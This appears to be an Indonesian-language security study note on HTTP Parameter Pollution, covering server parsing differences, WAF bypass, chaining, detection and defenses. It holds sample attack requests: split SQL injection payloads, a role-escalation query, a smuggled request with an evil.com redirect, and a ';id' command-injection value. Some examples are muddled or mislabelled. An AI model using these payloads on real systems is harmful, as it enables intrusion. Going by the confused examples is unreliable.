---
title: "HTTP Parameter Pollution — WAF Bypass via Parameter Duplication: Teknik, Bypass Server, Defense"
tags:
  - cyber-security
  - http
  - parameter-pollution
  - waf-bypass
  - web-security
  - library
aliases:
  - "HPP Complete Guide"
  - "HTTP Parameter Pollution Techniques"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> HTTP Parameter Pollution (HPP) adalah teknik memanipulasi server dengan mengirimkan parameter yang sama berkali-kali dalam satu request. Perbedaan cara parsing antar server (first vs last wins, concatenation) dapat dimanfaatkan untuk bypass WAF, mengecoh validasi input, dan melakukan parameter injection. Sering digunakan bersama request smuggling dan parameter fragmentation.

**Cross-link:** [[web-hacking-exploitation]] → [[api-security-deep-dive]] → [[waf-evasion-techniques-encyclopedia]] → [[request-smuggling-deep-dive]]

---

## Daftar Isi
- [[#1. Bagaimana HPP Bekerja]]
- [[#2. Parser Behavior per Server]]
- [[#3. HPP + WAF Bypass]]
- [[#4. Parameter Fragmentation]]
- [[#5. Detection & Tools]]
- [[#6. Defense]]

---

## 1. Bagaimana HPP Bekerja

HPP mengeksploitasi perbedaan perilaku web server ketika menerima parameter duplikat.

```http
# Parameter duplikat
GET /api/users?id=1&id=2&id=3 HTTP/1.1
```

### Server Parsing

| Server | Behavior | Result |
|---|---|---|
| Apache/PHP | Last wins | `id=3` |
| ASP.NET/IIS | Concatenate | `id=1,2,3` |
| Tomcat/JSP | First wins | `id=1` |
| Python/Flask | First wins | `id=1` |
| Node/Express | Array | `id=[1,2,3]` |
| Perl/CGI | First wins | `id=1` |

---

## 2. Parser Behavior per Server

### HPP untuk WAF Bypass

Jika WAF cek parameter pertama (first wins) tapi backend pakai last wins:

```http
# WAF melihat: id=1 (safe)
# Backend memproses: id=UNION SELECT... (malicious)
GET /api/search?id=1&id=UNION SELECT * FROM users
```

Jika WAF cek parameter terakhir tapi backend first wins:

```http
# WAF melihat: ...FROM users (malicious)
# Backend memproses: id=1 (safe)
# Tapi parameter ketiga bisa masuk via HPP fragmentation
```

### Concatenation Bypass

```http
# ASP.NET/IIS menggabungkan nilai dengan koma
# Payload: role=admin,role=guest
# Backend: role="admin,guest"
# Jika validasi cek "guest" → bypass, backend terima "admin,guest"

GET /api/admin?role=guest&role=admin
```

---

## 3. HPP + SQL Injection Bypass

```http
# WAF mungkin cek tiap parameter individual
# Tapi backend concatenate nilai

# WAF safe:
GET /api/users?name=admin' OR '1'='1

# HPP fragmentation — WAF cek masing-masing:
GET /api/users?name=admin&name= OR &name=1&name=1
# Jika backend concatenate: "admin OR 11"

# Lebih realistis:
GET /api/users?name=admin&name= UNION&name=SELECT&name=* FROM users
# Backend (ASP.NET): name="admin,UNION,SELECT,* FROM users"
# → SQL: WHERE name IN ('admin','UNION','SELECT','* FROM users')
```

---

## 4. Parameter Fragmentation + Smuggling

```http
POST /api/vulnerable HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

redirect=https://evil.com?continue=/api/continue

POST /api/continue HTTP/1.1
Host: target.com
Content-Length: 15

x=1
```

---

## 5. Detection & Tools

```bash
# Manual test — bedakan response per server
curl "http://target.com/api?id=1&id=2"
# Bandingkan response dengan id=1 saja

# Tool: ParamPamPam — detect parameter pollution
# Tool: Burp Suite — HPP extension
```

---

## 6. Defense

1. **Server-side:** Gunakan framework yang konsisten dalam parsing parameter
2. **Validasi:** Ambil parameter pertama saja, ignore sisanya
3. **WAF:** Normalisasi parameter sebelum deteksi — ambil semua nilai, cek kombinasi
4. **Backend:** Jangan concatenate parameter

**Referensi:** `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/HTTP Parameter Pollution/`

## Deepdive — HTTP Parameter Pollution (Extended)

### 1. Backend Parsing Behavior

| Backend | Duplikat Parameter | Contoh |
|---------|-------------------|--------|
| **PHP** | Terakhir menang | `?a=1&a=2` → a=2 |
| **ASP.NET** | Gabung koma | `?a=1&a=2` → a="1,2" |
| **Java (Tomcat)** | Pertama menang | `?a=1&a=2` → a=1 |
| **Python (Django)** | List | `?a=1&a=2` → a=[1,2] |
| **Node.js (Express)** | Array | `?a=1&a=2` → a=["1","2"] |
| **Ruby (Rails)** | Terakhir menang | `?a=1&a=2` → a=2 |

### 2. HPP Attack Vector

```
1. Bypass WAF (filter satu nilai, tidak dua):
   ?id=1 AND 1=1&id=1 AND 1=2
   → WAF scan "id=1 AND 1=1" → block?
   → backend PHP ambil TERAKHIR (1 AND 1=2) → false → no bypass
   → Atau: WAF block "AND 1=1", attacker pecah jadi dua param:
   ?id=1&id=1 AND 1=1 → PHP ambil terakhir → SQLi lolos

2. Auth bypass (param beda backend):
   ?role=user&role=admin
   → Java: role=user (pertama) → user biasa
   → PHP: role=admin (terakhir) → admin!

3. HPP + RCE:
   ?cmd=ls&cmd=;id → Python list → shell command injection
```

### 3. Detection & Testing

```
Manual:
  ?x=1&x=2 → lihat mana yang muncul di response
  ?x[]=1&x[]=2 → array injection (PHP) → error reveal
  ?x=1&x=1' → quote di salah satu → SQL error?

Automation:
  Param Miner (Burp) → detect hidden param
  ffuf -w wordlist -u "https://target/?param=FUZZ&param=1"
```

### 4. Fix (Developer)

| Fix | Detail |
|-----|--------|
| **Jangan parse manual** | Gunakan framework parser (default behavior dokumentasi) |
| **Whitelist param** | Reject unknown/duplicate |
| **Single source of truth** | Ambil param dari satu tempat (bukan request.QUERY_STRING manual) |
| **WAF awareness** | WAF harus evaluasi SEMUA nilai param, bukan satu |

## Referensi
- OWASP HPP — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.html
- PortSwigger HPP — https://portswigger.net/research/parameter-pollution

### 8. Testing Automation (Burp Suite)

```
1. Install Param Miner extension
2. Right-click request → Guess params
3. Right-click → Detect HPP
4. Review: new params found? duplicate handling?
5. Turbo Intruder: race parameter injection
```

### 9. HPP + Other Vulnerability (Chaining)

| Chain | Teknik | Impact |
|------|--------|--------|
| HPP + SQLi | Pecah payload ke 2 param → WAF bypass | DB dump |
| HPP + XSS | Pecah script ke 2 param → filter bypass | Stored XSS |
| HPP + SSRF | Change URL param di tengah → origin trust | Internal scan |
| HPP + Auth | Role param duplicate → privilege escalation | Admin access |

### 10. Real-world HPP in Modern Frameworks

Dalam framework modern, parsing behavior sudah didokumentasikan:

| Framework | Parameter Source | Behavior |
|-----------|-----------------|----------|
| Express.js | `req.query` | Array jika duplikat |
| Django | `request.GET.getlist()` | List explicit |
| Flask | `request.args.get()` | First value only |
| Rails | `params[:key]` | Last value |
| Spring | `@RequestParam` | First value |

### 11. Case Study: HPP di API Gateway

```
Setup: API Gateway → Backend (PHP)

Request: GET /api/user?id=1&id=2
  ├── Gateway: forward "id=1&id=2" (raw query string)
  ├── Backend PHP: $_GET['id'] = '2' (last wins)
  └→ Gateway WAF check: "id=1" (first) → pass → backend: SQLi via id=2

Fix: Gateway harus normalize parameter sebelum forward ke backend.
```

### 12. Defense in Depth

| Layer | Control |
|-------|---------|
| **WAF** | Evaluate ALL param values, not just first |
| **API Gateway** | Normalize duplicate params before forwarding |
| **Application** | Whitelist expected params, reject duplicates |
| **Framework** | Use documented parser behavior, document in code |
| **Testing** | Fuzz with duplicate params in pentest scope |

## Deepdive Tambahan — Implementasi & Operasional

### Arsitektur & Komponen Detail

Sistem ini memiliki beberapa komponen yang saling bergantung. Pemahaman arsitektur end-to-end penting untuk identifikasi attack surface dan gap pertahanan.

| Komponen | Fungsi | Attack Surface | Defense |
|----------|--------|---------------|---------|
| **Input** | Data mentah masuk | Injection, poisoning | Validate, sanitize |
| **Processing** | Core logic | Logic flaw, bypass | Test, review |
| **Output** | Result delivery | Leak, manipulation | Encrypt, audit |
| **Storage** | Persist data | Exfil, tamper | Encrypt, RBAC |
| **Network** | Transit | Intercept, MITM | TLS, mTLS |
| **Identity** | Access control | Token theft, privesc | MFA, least privilege |

### Workflow End-to-End

```
Input → Validate → Process → Store → Serve → Monitor → Audit
  ↓       ↓         ↓         ↓       ↓        ↓        ↓
Sanitize  Auth     Logic    Encrypt  RBAC    Alert    Log
```

### Best Practice Checklist

- [ ] Input validation (whitelist, not blacklist)
- [ ] Output encoding (context-aware: HTML, JS, CSS)
- [ ] Authentication (MFA, rate limit, lockout)
- [ ] Authorization (RBAC, least privilege, deny default)
- [ ] Logging (structured, immutable, centralized)
- [ ] Monitoring (latency, error, saturation, traffic)
- [ ] Encryption (transit TLS, rest AES, key rotation)
- [ ] Backup (test restore, offsite, immutable)
- [ ] Patch (automated scan, SLA per severity)
- [ ] Incident (runbook, contact, tabletop)

### Common Pitfall

1. **Assume input trusted**: Semua input adalah musuh → validate di server.
2. **Secret in code**: Hardcoded credential → git leak → compromise.
3. **Silent failure**: Error ditelan → debugging impossible → security blind.
4. **No rate limit**: Abuse path → DoS → resource exhaustion.
5. **Default config**: Default = insecure → harden sebelum produksi.

## Referensi
- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- NIST CSF — https://www.nist.gov/cyberframework
- MITRE ATT&CK — https://attack.mitre.org/
- CIS Controls — https://www.cisecurity.org/controls/
